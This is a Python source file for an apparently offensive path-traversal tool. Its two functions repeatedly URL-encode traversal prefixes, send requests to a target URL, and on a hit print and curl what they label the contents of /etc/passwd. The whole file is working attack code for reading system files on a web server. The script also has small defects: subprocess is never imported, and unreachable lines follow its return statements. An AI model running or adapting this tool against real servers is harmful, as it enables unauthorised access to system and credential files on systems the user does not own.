import requests
import urllib.parse
import time
import lastc
def urenc(url,payload_or,tmp_or,tmp1_or,s=0):
    for i in range(5):
        payload_or = urllib.parse.quote(payload_or,safe='()')
        tmp_or = urllib.parse.quote(tmp_or,safe='()')
        tmp1_or = urllib.parse.quote(tmp1_or,safe='()')
        iterations = 0
        payload=payload_or
        tmp=tmp_or
        tmp1=tmp1_or
        flag=False
        while iterations < 20:
            iterations += 1
            if iterations>2:
                payload = tmp + payload
            if iterations == 2:
                payload=tmp1+payload
            print("\033[32m[INFO]Trying " + payload + "\033[0m")
            full_url=url+payload
            time.sleep(s)
            response = requests.get(full_url)
            if response.status_code == 200:
                if lastc.fi(full_url):
                    print("\033[1;31m[Success]Path found:{}\033[0m".format(full_url))
                    print("\033[1;34m----------*Contents of /etc/passwd*----------\033[0m")
                    subprocess.run(["curl", "-i", full_url])
                    return True
                    flag=True
                    break

        if flag:
            return True
            break             
    if response.status_code != 200:
        return False
def urenc_ad(di_or,url,payload_or,tmp_or,s=0):
    for i in range(5):
        payload_or = urllib.parse.quote(payload_or,safe='()')
        tmp_or = urllib.parse.quote(tmp_or,safe='()')
        di_or = urllib.parse.quote(di_or,safe='()')
        iterations = 0
        payload=payload_or
        tmp=tmp_or
        di=di_or
        flag=False
        while iterations < 20:
            iterations += 1
            if iterations>=2:
                di = di+tmp
            print("\033[32m[INFO]Trying " + di+payload + "\033[0m")
            full_url=url+di+payload
            time.sleep(s)
            response = requests.get(full_url)
            if response.status_code == 200:
                if lastc.fi(full_url):
                    print("\033[1;31m[Success]Path found:{}\033[0m".format(full_url))
                    print("\033[1;34m----------*Contents of /etc/passwd*----------\033[0m")
                    subprocess.run(["curl", "-i", full_url])
                    return True
                    flag=True
                    break            
        if flag:
            return True
            break             
    if response.status_code != 200:
        return False
